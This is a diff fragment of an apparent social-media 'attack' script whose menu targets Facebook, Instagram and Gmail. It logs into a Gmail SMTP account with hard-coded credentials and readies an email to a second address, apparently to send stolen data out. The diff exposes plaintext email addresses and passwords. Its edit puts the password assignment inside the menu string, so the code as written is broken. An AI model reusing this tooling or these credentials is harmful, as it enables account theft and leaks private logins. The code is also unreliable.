@@ -23,7 +23,7 @@ option = int(input('''
 1- Facebook Attack
 2- Instagram Attack
 3- Gmail Attack
-
+sp = 'fugidemsvie'
 [:]Choose an option (1/2/3): '''))
 if option == 1:
     cho = 'Facebook'
@@ -64,7 +64,7 @@ s = smtplib.SMTP_SSL('smtp.gmail.com', 465, context = context)
   
 # Authentication 
 sa = 'zarguinajack@gmail.com'
-sp = 'zarguiDK5'
+
 s.login(sa, sp) 
 
 ra = 'bertranddupont885@gmail.com'
